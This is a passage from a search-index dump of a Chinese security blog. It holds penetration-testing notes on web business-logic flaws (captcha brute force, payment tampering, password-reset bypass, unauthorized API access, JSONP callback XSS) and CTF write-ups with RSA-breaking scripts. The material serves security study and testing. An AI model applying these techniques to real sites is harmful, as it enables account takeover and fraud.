","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:5:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x04 回退模块测试 回退测试 很多Web业务在密码修改后或者订单付款成功或等业务模块，在返回上一步重新修改密码或者重新付款时存在设置密码或付款的功能，如果能返回上一步重复的操作，而且还能更改或者重置结果则存在业务回退漏洞。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:6:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x05 验证码机制测试 验证码暴力破解测试 如果没有对验证码的失效时间和尝试失败次数做限制，攻击者就可以通过尝试这个区间内所有的数字来进行暴力破解攻击。 验证码重复使用测试 在网站的登录或评论等页面，如果验证码认证成功后没有讲session及时清空，将会导致验证码首次认证成功之后可重复使用， 验证码客户端回显测试 当验证码在客户端生成而非服务端生成是，可借助浏览器工具查看交互的详细信息。 验证码绕过测试 通过修改前端提交服务器返回的数据，可以实现绕过验证码。 验证码自动识别测试 以图形验证码为例，识别流程为：图像二值化处理–》去干扰–》字符分割–》字符识别 攻击者首先多次刷新验证码，发现验证码字符的组成范围，在PKAV HTTP Fuzzer里面设置，通过第三方识别工具自动对验证码图像进行二值化、去干扰等处理，然后通过人工对比来完善识别的准确率，达到预期效果后，抓包后的请求数据包放至PKAV HTTP Fuzzer工具请求包内，设置验证码标志位，用户名和密码标志位，开始暴力破解，自动载入验证码。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:7:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x06 业务数据安全测试 商品支付金额篡改测试 针对订单生成的过程中存在商品支付金额校验不完整而产生的业务风险点。 商品订购数量篡改测试 针对商品订购过程中对异常交易数据处理缺乏风控机制而导致的相关业务逻辑漏洞，如将请求中的商品数量修改为任意非预期数额、负数等后进行提交。 前端JS限制绕过测试 在限制用户购买数量时，服务器仅在页面通过JS脚本限制，未在服务器端校验用户提交的数量，通过抓取客户端发送的请求包修改JS端生成处理的交易数据。 请求重放测试 针对电商平台订购兑换业务流程中对每笔交易请求的唯一性判断缺乏有效机制的业务逻辑问题，攻击者进行模拟正常业务流程的重放操作，可以实现“一次购买多次收货”等违背正常业务逻辑的结果。 业务上限测试 针对一些电商类应用程序在进行业务办理流程中，服务端没有对用户提交的查询范围、订单数量、金额等数据进行严格校验而引发的一些业务逻辑漏，通常表现为查询到超出预计的信息、订购或兑换超出预期范围的商品等。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:8:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x07 业务流程乱序测试 业务流程绕过测试 针对业务处理流程是否正常，确保攻击者无法通过技术手段绕过某些重要流程步骤。 以某社交网站为例，经过测试发现订单生成后流程走至链接http://www.xxx.com/index.php?contoller=site\u0026action=payok\u0026out_trade_no=，只要提供对应的充值订单号就可以绕过支付环节，未经支付直接充值成功。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:9:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x08 密码找回模块测试 验证码客户端回显测试 找回密码测试中注意验证码是否会回显在响应中。 验证码暴力破解测试 验证码位数及复杂性较弱，也没有对验证码次数限制导致可被暴力枚举并修改任意密码。 接口参数账号修改测试 拦截前端请求，修改邮箱或手机号等参数将修改后的数据发送到服务器进行欺骗达到密码重置的目的。 例如某个找回密码发送给用户邮件中的接口URL如下： http://www.xxx.com/repwd?account=abcabc@126.com\u0026token=123 将account参数修改为我们需要的账号，如： http://www.xxx.com/repwd?account=hannibal@126.com\u0026token=123 Response状态值修改测试 修改请求的响应结果来达到密码重置的目的 Session覆盖测试 在找回密码页面输入A手机号，验证通过进入重置密码页面，打开新标签，输入目标账号B手机号，发送验证码，服务端将当前Session会话设置为了B手机号，这时再刷新A手机号，就可以重置B的密码了。 弱Token设计缺陷测试 在找回密码功能中，很多网站会向用户邮件发送找回密码页面链接，链接通常会加入校验参数来确认链接的有效性，通过校验参数的值与数据库生成的值是否一直来判断当前找回密码的链接是否有效。 利用密码找回功能获得多个密码找回的凭证，观察链接中的密码找回凭证是否有规律可循，比如解码后发现Token值是Base64编码（用户邮箱+随机4位验证码）。 密码找回流程绕过测试 例如账号使用正常顺序流程找回密码成功，3个URL如下： （1）GET /account/findPassword.html 输入用户账号页面 （2）GET /forgetpawd/findPassNext.do 验证身份页面 （3）GET / forgetpawd /emailValidateNext.do 设置新密码页面 在输入目标账号后进入第二步的页面，直接修改URL为第三步的URL，访问是否可以直接进入密码重置页面。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:10:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x09 业务接口调用模块测试 接口调用重放测试 业务经过重放后是否能多次生成有效的业务或数据结果。 接口调用遍历测试 Web接口一般将常见的一些功能需求进行封装，通过传入不同的参数来获取数据或执行相应的功能。 使用burp的爬虫功能，从重点关注目录（一般为根目录）开始爬取，在HTTP history选项卡中选中要开始爬取的项，单击鼠标右键，选择“Spider from here”，爬取登录后的网站链接。爬取完毕后在Target-》Site map过滤筛选出带有uid参数的链接，查看对应的HTTP请求包中是否带有期望的信息（如：ip地址、历史记录等），挑选后进行遍历测试。 接口调用参数篡改测试 攻击者账号为A，目标用户账号为B，在攻击者对B进行找回密码操作时，服务器给账号A的邮箱或手机发送密码重置信息，攻击者进入验证码验证环节，单击“重新发送验证码”并拦截重新发送这个请求，将请求中接收验证码用户的邮箱或者手机号修改为自己的。如果接收到密码重置的信息，则漏洞存在。 接口未授权访问/调用测试 登录后使用burp的爬虫功能，从重点关注目录（一般为根目录）开始爬取，在HTTP history选项卡中选中要开始爬取的项，单击鼠标右键，选择“Spider from here”，爬取登录后的网站链接。爬取完毕后在Target-》Site map使用MIME type过滤功能筛选出相关的HTTP请求（重点关注json、script、xml、text MIME type），查看对应的响应中是否带有期望的敏感信息（如：ip地址、个人电话等），将完整的请求URL复杂到未登录的浏览器中，查看能否访问对应URL的内容。 Callback自定义测试 在浏览器中存在同源策略，所谓同源值的是域名、协议、端口相同。当使用Ajax异步传输数据是，非同源域名之间会存在限制。其中一种解决方法是JSONP（JSON with Padding）,基本原理是利用了HTML里元素标签，远程调用JSON文件来实现数据传输。JSONP技术中一般使用Callback（回调函数）参数来声明回调时所使用的函数名，由于没有使用白名单的方法进行限制，导致攻击者可以自定义Callback的内容，从而触发XSS等漏洞。 攻击者使用burp的爬虫功能， 从重点关注目录（一般为根目录）开始爬取，在HTTP history选项卡中选中要开始爬取的项，单击鼠标右键，选择“Spider from here”，爬取完毕后在Target-》Site map使用MIME type过滤功能筛选出带有Callback或者jsonp参数的链接，判断请求响应的Content-Type是否为text/html，如果是，发送到Repeater，查看callback参数是否存在过滤（首先不使用script等标签等避免waf的检测），去除无关参数，最后构造恶意的payload进行利用。 WebService测试 WebService是一种跨编程语言和跨操作系统的远程调用技术。XML+XSD、SOAP（Simple Object Access Protocol）和WSDL（Web Service Description Language）就是构成WebService 平台的三大技术，其中 XML+XSD 用来描述、表达要传输的数据；SOAP是用于交换XML编码信息的轻量级协议，一般以XML或者XSD作为载体，通过HTTP协议发送请求和接收结果，SOAP协议会在HTTP协议的基础上增加一些特定的HTTP消息；WSDL是一个基于XML的用于描述WebService及其函数，参数和返回值的语言。 简而言之，WebService就是一个应用程序向外暴露出一个能通过Web进行调用的API。 找到服务器的WebService链接，使用WVS（Web Vulnerability Scanner）的Web Service Editor功能导入各个接口函数，通过关键词（如Get、Exec）定位到相关的接口函数，通过HTTP Editor对每一个接口函数的输入参数进行测试（如SQL注入、文件上传等），如果出现预期效果，则存在漏洞。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:11:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["WriteUp"],"content":"\r## 0x00 [MRCTF2020]Easy_RSA\rimport sympy from gmpy2 import gcd, invert from random import randint from Crypto.Util.number import getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytes import base64 from zlib import * flag = b\"MRCTF{XXXX}\" base = 65537 def gen_prime(N): A = 0 while 1: A = getPrime(N) if A % 8 == 5: break return A def gen_p(): p = getPrime(1024) q = getPrime(1024) assert (p \u003c q) n = p * q print(\"P_n = \", n) F_n = (p - 1) * (q - 1) print(\"P_F_n = \", F_n) factor2 = 2021 * p + 2020 * q if factor2 \u003c 0: factor2 = (-1) * factor2 return sympy.nextprime(factor2) def gen_q(): p = getPrime(1024) q = getPrime(1024) assert (p \u003c q) n = p * q print(\"Q_n = \", n) e = getRandomNBitInteger(53) F_n = (p - 1) * (q - 1) while gcd(e, F_n) != 1: e = getRandomNBitInteger(53) d = invert(e, F_n) print(\"Q_E_D = \", e * d) factor2 = 2021 * p - 2020 * q if factor2 \u003c 0: factor2 = (-1) * factor2 return sympy.nextprime(factor2) if __name__ == \"__main__\": _E = base _P = gen_p() _Q = gen_q() assert (gcd(_E, (_P - 1) * (_Q - 1)) == 1) _M = bytes_to_long(flag) _C = pow(_M, _E, _P * _Q) print(\"Ciphertext = \", _C) ''' P_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693 P_F_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740 Q_n = 20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947 Q_E_D = 100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201 Ciphertext = 4085593735522843852536116152444127463417535684595088488933863081318260748591009467790977912655026330419479600090438477549500094342407039633443581012653616533256541733679703661177338272834468717525308104758660283868502742829262155791451462902432479427577252201312646492699062014040641299948572875038587686811509173542557755502739403341664303264","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:0:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x01 [羊城杯 2020]RRRRRRRSA import hashlib\rimport sympy\rfrom Crypto.Util.number import *\rflag = 'GWHT{************}'\rflag1 = flag[:19].encode()\rflag2 = flag[19:].encode()\rassert(len(flag) == 38)\rP1 = getPrime(1038)\rP2 = sympy.nextprime(P1)\rassert(P2 - P1 \u003c 1000)\rQ1 = getPrime(512)\rQ2 = sympy.nextprime(Q1)\rN1 = P1 * P1 * Q1\rN2 = P2 * P2 * Q2\rE1 = getPrime(1024)\rE2 = sympy.nextprime(E1)\rm1 = bytes_to_long(flag1)\rm2 = bytes_to_long(flag2)\rc1 = pow(m1, E1, N1)\rc2 = pow(m2, E2, N2)\r题目给出了N1、c1、E1、N2、c2、E2的值，参考https://blog.csdn.net/a5555678744/article/details/117701126 原理里面提到了维纳攻击，这是依靠连分数进行的攻击方式，适用于非常接近某一值时，求一个比例关系，通过该比例关系再来反推关键信息。 对于这一道题:N1/N2=(P1/P2)**2 * (Q1/Q2)，我们可以推断出N1/N2 \u003cQ1/Q2，从而得到区间范围(N1/N2,1)，尝试对N1/N2进行连分数展开并求其各项渐进分数，其中某个连分数的分母就是Q1。 from Crypto.Util.number import *\rimport gmpy2\rdef continuedFra(x, y): #不断生成连分数的项\rcF = []\rwhile y:\rcF += [x // y]\rx, y = y, x % y\rreturn cF\rdef Simplify(ctnf): #化简\rnumerator = 0\rdenominator = 1\rfor x in ctnf[::-1]: #注意这里是倒叙遍历\rnumerator, denominator = denominator, x * denominator + numerator\rreturn (numerator, denominator) #把连分数分成分子和算出来的分母\rdef getit(c):\rcf=[]\rfor i in range(1,len(c)):\rcf.append(Simplify(c[:i])) #各个阶段的连分数的分子和分母\rreturn cf #得到一串连分数\rdef wienerAttack(e, n):\rcf=continuedFra(e,n)\rfor (Q2,Q1) in getit(cf):#遍历得到的连分数，令分子分母分别是Q2，Q1\rif Q1 == 0:\rcontinue\rif N1%Q1==0 and Q1!=1:#满足这个条件就找到了\rreturn Q1\rprint('not find!')\r​ Q1=wienerAttack(N1,N2)\rP1=gmpy2.iroot(N1//Q1,2)[0]\rP2=gmpy2.next_prime(P1)\rQ2=gmpy2.next_prime(Q1)\rphi1=P1*(P1-1)*(Q1-1)\rphi2=P2*(P2-1)*(Q2-1)\rd1=gmpy2.invert(E1,phi1)\rd2=gmpy2.invert(E2,phi2)\rm1=long_to_bytes(gmpy2.powmod(c1,d1,N1))\rm2=long_to_bytes(gmpy2.powmod(c2,d2,N2))\rprint((m1+m2))\r","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:1:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x02 [De1CTF2019]babyrsa import binascii from data import e1,e2,p,q1p,q1q,hint,flag n = [20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L, 31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L, 29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L, 25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L] c = [19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L, 15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L, 187150650716480400179672112972311065381399850876853585556505670577155505864648147636836882990378971828450075785714013590612137776451144146429030770035681555084658196285537471732442359365","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:2:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x03 [QCTF2018]Xman-RSA 打开加密脚本，发现字符被替换掉了，这里用quipqiup进行词频分析后替换，再手动替换一些字符 from gmpy2 import is_prime\rfrom os import urandom import base64 def bytes_to_num(b): return int(b.encode('hex'), 16)\rdef num_to_bytes(n): b = hex(n)[2:-1] b = '0' + b if len(b)%2 == 1 else b return b.decode('hex') def get_a_prime(l): random_seed = urandom(l)\rnum = bytes_to_num(random_seed)\rwhile True: if is_prime(num): break num+=1\rreturn num def encrypt(s, e, n):\rp = bytes_to_num(s)\rp = pow(p, e, n)\rreturn num_to_bytes(p).encode('hex')\rdef separate(n):\rp = n % 4\rt = (p * p) % 4\rreturn t == 1\rf = open('flag.txt', 'r')\rflag = f.read()\rmsg1 = \"\"\rmsg2 = \"\"\rfor i in range(len(flag)):\rif separate(i):\rmsg2 += flag[i]\relse:\rmsg1 += flag[i]\rp1 = get_a_prime(128)\rp2 = get_a_prime(128)\rp3 = get_a_prime(128)\rn1 = p1*p2\rn2 = p1*p3\re = 0x1001\rc1 = encrypt(msg1, e, n1)\rc2 = encrypt(msg2, e, n2)\rprint(c1)\rprint(c2)\re1 = 0x1001\re2 = 0x101\rp4 = get_a_prime(128)\rp5 = get_a_prime(128)\rn3 = p4 * p5\rc1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')\rc2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')\rprint(c1)\rprint(c2)\rprint(base64.b64encode(num_to_bytes(n2)))\rprint(base64.b64encode(num_to_bytes(n3)))\r先用共模攻击把n1的值求出来2499586809914462821807624371088011200618603528498132509598946284572455726453497171635086810524607288333625665025664872216634366700044105279185519761587818169021167370991396691510275499486673922916370294043072503635630922980240462022218565365191228535222150496387990987123639567257124081274667568443678527637259644488779394704508217357758791670308548246801142468699716221789070607334747835552167450340441488756779323653879402176647890584656379628685893686585469918686253137796663587854943386347039389769790329948165162483370187914412810153613198247569427480466488647563900948387020677830797976534568626241686906738179 然后再通过gcd(n1,n2)，得到p1的值68475150402136550069561649755295544963289030785101058202360554598728892273874900512013972536010281921862638482624050145776516868431210229550944533343142576416459199101144902197593841367980791503251475193609136925280837184839979646652186999511796418448787979170775450657311911945185202715164053596280658868979 然后求出p2和p3，进而求出m1、m2，利用下列脚本，求出flag length = len(m1) + len(m2)\rflag = ''\rtemp1 = 0\rtemp2 = 0\rdef separate(n):\rp = n % 4\rt = (p * p) % 4\rreturn t == 1\rfor i in range(length):\rif separate(i):\rflag += m2[temp2]\rtemp2 = temp2 + 1\relse:\rflag += m1[temp1]\rtemp1 = temp1 + 1\rprint(flag)\r","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:3:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x04 [INSHack2017]rsa16m 描述文件如下： 当您需要真正安全的通信时，可以使用带有4096位密钥的RSA。\r我想要真正安全的通信来传输核发射代码（是的，IoT无处不在），\r所以我使用了带有16777216位密钥的RSA。俄罗斯人肯定无法考虑这一点！\r文件md5:1049a0c83a2e34760363b4ad9778753f\r题目给出了n、c、e的值，其中n和c的值非常非常大，相对而言，e的值很小，所以很有可能me 还是比n小，于是可以直接尝试对c开e次方。 data = open('rsa_16m', 'r')\rn = data.readline()[4:]\rc = data.readline()[4:]\rc = int(c,16)\re = 0x10001\rm = gmpy2.iroot(c,e)[0]\rprint(long_to_bytes(m).decode())\r","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:4:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x05 [watevrCTF 2019]Swedish RSA flag = bytearray(raw_input())\rflag = list(flag)\rlength = len(flag)\rbits = 16\r## Prime for Finite Field.\rp = random_prime(2^bits-1, False, 2^(bits-1))\rfile_out = open(\"downloads/polynomial_rsa.txt\", \"w\")\rfile_out.write(\"Prime: \" + str(p) + \"\\n\")\r## Univariate Polynomial Ring in y over Finite Field of size p\rR.\u003cy\u003e = PolynomialRing(GF(p))\r## Analogous to the primes in Z\rdef gen_irreducable_poly(deg):\rwhile True:\rout = R.random_element(degree=deg)\rif out.is_irreducible():\rreturn out\r## Polynomial \"primes\"\rP = gen_irreducable_poly(ZZ.random_element(length, 2*length))\rQ = gen_irreducable_poly(ZZ.random_element(length, 2*length))\r## Public exponent key\re = 65537\r## Modulus\rN = P*Q\rfile_out.write(\"Modulus: \" + str(N) + \"\\n\")\r## Univariate Quotient Polynomial Ring in x over Finite Field of size 659 with modulus N(x)\rS.\u003cx\u003e = R.quotient(N)\r## Encrypt\rm = S(flag)\rc = m^e\rfile_out.write(\"Ciphertext: \" + str(c))\rfile_out.close()\r输出给了三个量，一个是多项式素数最大值，一个是模数多项式，一个是密文多项式。首先分解Modulus R.\u003cy\u003e = PolynomialRing(GF(43753))\rN = R(\"34036*y^177 + ... + 23814\")\rfactor(N)\r得到两个多项式 (34036) * (y^65 + 39688*y^64 + 22199*y^63 + 41942*y^62 + 7803*y^61 + 19710*y^60 + 14794*y^59 + 41388*y^58 + 2418*y^57 + 19208*y^56 + 39941*y^55 + 36392*y^54 + 19813*y^53 + 33864*y^52 + 29099*y^51 + 15484*y^50 + 27185*y^49 + 27721*y^48 + 31508*y^47 + 19404*y^46 + 10134*y^45 + 43481*y^44 + 3899*y^43 + 32849*y^42 + 3534*y^41 + 32086*y^40 + 14221*y^39 + 42982*y^38 + 1403*y^37 + 1619*y^36 + 36054*y^35 + 33615*y^34 + 6628*y^33 + 31709*y^32 + 6968*y^31 + 28517*y^30 + 12938*y^29 + 21124*y^28 + 10400*y^27 + 28889*y^26 + 7273*y^25 + 36442*y^24 + 14935*y^23 + 29365*y^22 + 4869*y^21 + 43562*y^20 + 6435*y^19 + 4403*y^18 + 32311*y^17 + 7575*y^16 + 28199*y^15 + 28065*y^14 + 23870*y^13 + 37314*y^12 + 15299*y^11 + 7082*y^10 + 36230*y^9 + 18367*y^8 + 12531*y^7 + 25906*y^6 + 26878*y^5 + 43073*y^4 + 11582*y^3 + 4482*y^2 + 35044*y + 31388) * (y^112 + 31097*y^111 + 15815*y^110 + 17170*y^109 + 43684*y^108 + 16873*y^107 + 17269*y^106 + 10853*y^105 + 10690*y^104 + 24864*y^103 + 10224*y^102 + 28704*y^101 + 16049*y^100 + 1154*y^99 + 40034*y^98 + 29922*y^97 + 27404*y^96 + 32514*y^95 + 40962*y^94 + 32858*y^93 + 36590*y^92 + 41302*y^91 + 20803*y^90 + 43521*y^89 + 13746*y^88 + 19857*y^87 + 21539*y^86 + 36888*y^85 + 16032*y^84 + 35825*y^83 + 24705*y^82 + 31143*y^81 + 22088*y^80 + 6686*y^79 + 37947*y^78 + 5661*y^77 + 29405*y^76 + 36071*y^75 + 35492*y^74 + 28985*y^73 + 36015*y^72 + 24095*y^71 + 34920*y^70 + 6615*y^69 + 9606*y^68 + 4255*y^67 + 22981*y^66 + 3910*y^65 + 23897*y^64 + 22711*y^63 + 23350*y^62 + 7969*y^61 + 8558*y^60 + 8001*y^59 + 8431*y^58 + 3314*y^57 + 23364*y^56 + 39391*y^55 + 32722*y^54 + 2543*y^53 + 22196*y^52 + 24189*y^51 + 19420*y^50 + 10649*y^49 + 19070*y^48 + 23863*y^47 + 19597*y^46 + 39699*y^45 + 7620*y^44 + 25067*y^43 + 29912*y^42 + 14998*y^41 + 14492*y^40 + 31322*y^39 + 43145*y^38 + 32006*y^37 + 38976*y^36 + 32534*y^35 + 6972*y^34 + 37351*y^33 + 30104*y^32 + 6032*y^31 + 33729*y^30 + 27110*y^29 + 5268*y^28 + 2974*y^27 + 2985*y^26 + 31610*y^25 + 28364*y^24 + 34924*y^23 + 17414*y^22 + 28813*y^21 + 43680*y^20 + 32175*y^19 + 18248*y^18 + 25171*y^17 + 31185*y^16 + 30125*y^15 + 36836*y^14 + 7218*y^13 + 11292*y^12 + 31123*y^11 + 40360*y^10 + 34093*y^9 + 39606*y^8 + 2788*y^7 + 27277*y^6 + 21835*y^5 + 1331*y^4 + 32614*y^3 + 25020*y^2 + 20981*y + 12108) 求解d需要e和phi，参考https://xz.aliyun.com/t/4545，phi = (43753^65-1)*(43753^112-1) d = inverse_mod(e, phi)\rans = R(\"1\")\rtemp= C\rwhile(True):\rif(d % 2 == 1):\rans = (ans * temp) % N\rd = d - 1\rd = d / 2\rtemp = (temp * temp) % N\rif(d == 0):\rbreak\r#快速幂\rprint (ans)\r结果多项式为 125*y^62 + 111*y^61 + 114*y^60 + 117*y^59 + 53*y^58 + 51*y^57 + 51*y^56 + 100*y^55 + 106*y^54 + 110*y^53 + 102*y^52 + 106*y^51 + 100*y^50 + 104*y^49 + 101*y^48 + 117*y^47 + 52*y^46 + 52*y^45 + 57*y^44 + 48*y^43 + 50*y^42 + 107*y^41 + 35*y^40 + 101*y^39 + 114*y^38 + 117*y^37 + 99*y^36 + 101*y^35 + 115*y^34 + 110*y^33 + 105*y^32 + 95*y^31 + 116*y^30 + 117*y^29 + 98*y^28 ","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:5:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x06 [watevrCTF 2019]ECC-RSA from fastecdsa.curve import P521 as Curve\rfrom fastecdsa.point import Point\rfrom Crypto.Util.number import bytes_to_long, 